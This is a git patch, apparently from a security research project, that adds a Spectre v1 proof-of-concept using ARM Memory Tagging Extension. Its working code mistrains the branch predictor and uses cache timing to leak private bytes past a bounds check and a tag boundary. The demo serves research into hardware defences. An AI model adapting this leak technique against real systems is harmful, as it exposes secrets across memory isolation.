@@ -1,0 +1,204 @@
+From b1f703913db28d4ca953959b39fb99f51760a6e6 Mon Sep 17 00:00:00 2001
+From: Mark Brand <markbrand@google.com>
+Date: Thu, 3 Aug 2023 16:11:04 +0200
+Subject: [PATCH] Add MTE spectre test.
+
+---
+ demos/CMakeLists.txt           |   5 +-
+ demos/spectre_v1_pht_sa_mte.cc | 163 +++++++++++++++++++++++++++++++++
+ 2 files changed, 167 insertions(+), 1 deletion(-)
+ create mode 100644 demos/spectre_v1_pht_sa_mte.cc
+
+diff --git a/demos/CMakeLists.txt b/demos/CMakeLists.txt
+index ce3d67b..831f5ae 100644
+--- a/demos/CMakeLists.txt
++++ b/demos/CMakeLists.txt
+@@ -127,12 +127,15 @@ function(add_demo demo_name)
+   endif()
+ 
+   add_executable(${demo_name} ${demo_name}.cc ${ARG_ADDITIONAL_SOURCES})
+-  target_link_libraries(${demo_name} safeside)
++  target_link_libraries(${demo_name} safeside -static)
+ endfunction()
+ 
+ # Spectre V1 PHT SA -- mistraining PHT in the same address space
+ add_demo(spectre_v1_pht_sa)
+ 
++# Spectre V1 PHT SA -- mistraining PHT in the same address space with MTE
++add_demo(spectre_v1_pht_sa_mte)
++
+ # Spectre V1 BTB SA -- mistraining BTB in the same address space
+ add_demo(spectre_v1_btb_sa)
+ 
+diff --git a/demos/spectre_v1_pht_sa_mte.cc b/demos/spectre_v1_pht_sa_mte.cc
+new file mode 100644
+index 0000000..68dd642
+--- /dev/null
++++ b/demos/spectre_v1_pht_sa_mte.cc
+@@ -0,0 +1,163 @@
++/*
++ * Copyright 2023 Google LLC
++ *
++ * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
++ * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
++ *
++ * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
++ */
++
++// Causes misprediction of conditional branches that leads to a bounds check
++// being bypassed during speculative execution. Leaks architecturally
++// inaccessible data from the process's address space.
++//
++// PLATFORM NOTES:
++// This program should leak data on pretty much any system where it compiles.
++// We only require an out-of-order CPU that predicts conditional branches.
++
++#include <array>
++#include <cstring>
++#include <iostream>
++#include <memory>
++
++#include "instr.h"
++#include "local_content.h"
++#include "timing_array.h"
++#include "utils.h"
++
++#include <cassert>
++#include <fcntl.h>
++#include <sys/mman.h>
++#include <sys/prctl.h>
++#include <unistd.h>
++
++namespace mte {
++void enable(bool sync=true, uint16_t tag_mask=0xfffe) {
++  int ctrl = sync ? PR_MTE_TCF_SYNC : PR_MTE_TCF_ASYNC;
++  ctrl |= tag_mask << PR_MTE_TAG_SHIFT;
++  assert(0 == prctl(PR_SET_TAGGED_ADDR_CTRL, ctrl, 0, 0, 0));
++}
++
++void disable() {
++  assert(0 == prctl(PR_SET_TAGGED_ADDR_CTRL, PR_MTE_TCF_NONE, 0, 0, 0));
++}
++
++template<typename T>
++T* tagz(T* ptr, size_t len, uint8_t tag=0) {
++  if (tag == 0) {
++    asm volatile ("irg %0, %0\n" : "+r"(ptr));
++  } else {
++    ptr = (T*)(((uintptr_t)ptr) | ((uintptr_t)tag) << 56);
++  }
++  T* end_ptr = ptr;
++  for (size_t i = 0; i < len; i += 16) {
++    asm volatile ("stzg %0, [%0], #16\n" : "+r"(end_ptr));
++  }
++  return ptr;
++}
++
++uint8_t tag(void* ptr) {
++  uintptr_t address;
++  memcpy(&address, &ptr, sizeof(address));
++  return static_cast<uint8_t>(address >> 56);
++}
++} // namespace mte
++
++char* tagged_public_data = nullptr;
++char* tagged_private_data = nullptr;
++
++// Leaks the byte that is physically located at &text[0] + offset, without ever
++// loading it. In the abstract machine, and in the code executed by the CPU,
++// this function does not load any memory except for what is in the bounds
++// of `text`, and local auxiliary data.
++//
++// Instead, the leak is performed by accessing out-of-bounds during speculative
++// execution, bypassing the bounds check by training the branch predictor to
++// think that the value will be in-range.
++static char LeakByte(const char *data, size_t offset) {
++  TimingArray timing_array;
++  // The size needs to be unloaded from cache to force speculative execution
++  // to guess the result of comparison.
++  //
++  // TODO(asteinha): since size_in_heap is no longer the only heap-allocated
++  // value, it should be allocated into its own unique page
++  std::unique_ptr<size_t> size_in_heap = std::unique_ptr<size_t>(
++      new size_t(strlen(data)));
++
++  for (int run = 0;; ++run) {
++    timing_array.FlushFromCache();
++    // We pick a different offset every time so that it's guaranteed that the
++    // value of the in-bounds access is usually different from the secret value
++    // we want to leak via out-of-bounds speculative access.
++    int safe_offset = run % strlen(data);
++
++    // Loop length must be high enough to beat branch predictors.
++    // The current length 2048 was established empirically. With significantly
++    // shorter loop lengths some branch predictors are able to observe the
++    // pattern and avoid branch mispredictions.
++    for (size_t i = 0; i < 2048; ++i) {
++      // Remove from cache so that we block on loading it from memory,
++      // triggering speculative execution.
++      FlushDataCacheLine(size_in_heap.get());
++
++      // Train the branch predictor: perform in-bounds accesses 2047 times,
++      // and then use the out-of-bounds offset we _actually_ care about on the
++      // 2048th time.
++      // The local_offset value computation is a branchless equivalent of:
++      // size_t local_offset = ((i + 1) % 2048) ? safe_offset : offset;
++      // We need to avoid branching even for unoptimized compilation (-O0).
++      // Optimized compilations (-O1, concretely -fif-conversion) would remove
++      // the branching automatically.
++      size_t local_offset =
++          offset + (safe_offset - offset) * static_cast<bool>((i + 1) % 2048);
++
++      if (local_offset < *size_in_heap) {
++        // This branch was trained to always be taken during speculative
++        // execution, so it's taken even on the 2048th iteration, when the
++        // condition is false!
++        ForceRead(&timing_array[data[local_offset]]);
++      }
++    }
++
++    int ret = timing_array.FindFirstCachedElementIndexAfter(data[safe_offset]);
++    if (ret >= 0 && ret != data[safe_offset]) {
++      return ret;
++    }
++
++    if (run > 100000) {
++      std::cerr << "Does not converge" << std::endl;
++      exit(EXIT_FAILURE);
++    }
++  }
++}
++
++int main() {
++  mte::enable(false);
++
++  tagged_public_data = (char*)mmap(nullptr, 0x1000, 
++    PROT_READ|PROT_WRITE|PROT_MTE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
++
++  tagged_private_data = (char*)mmap(nullptr, 0x1000, 
++    PROT_READ|PROT_WRITE|PROT_MTE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
++
++  const size_t private_offset = tagged_private_data - tagged_public_data;
++
++  tagged_public_data = mte::tagz(tagged_public_data, 0x1000, 1);
++  tagged_private_data = mte::tagz(tagged_private_data, 0x1000, 2);
++
++  strcpy(tagged_public_data,  public_data);
++  strcpy(tagged_private_data, private_data);
++
++  std::cout << "Leaking the string: ";
++  std::cout.flush();
++  for (size_t i = 0; i < strlen(tagged_private_data); ++i) {
++    // On at least some machines, this will print the i'th byte from
++    // private_data, despite the only actually-executed memory accesses being
++    // to valid bytes in public_data.
++    std::cout << LeakByte(tagged_public_data, private_offset + i);
++    std::cout.flush();
++  }
++  std::cout << "\nDone!\n";
++
++  std::cout << "Checking that we would crash during architectural access:\n" << tagged_public_data[private_offset];
++}
+-- 
+2.41.0.585.gd2178a4bd4-goog
+
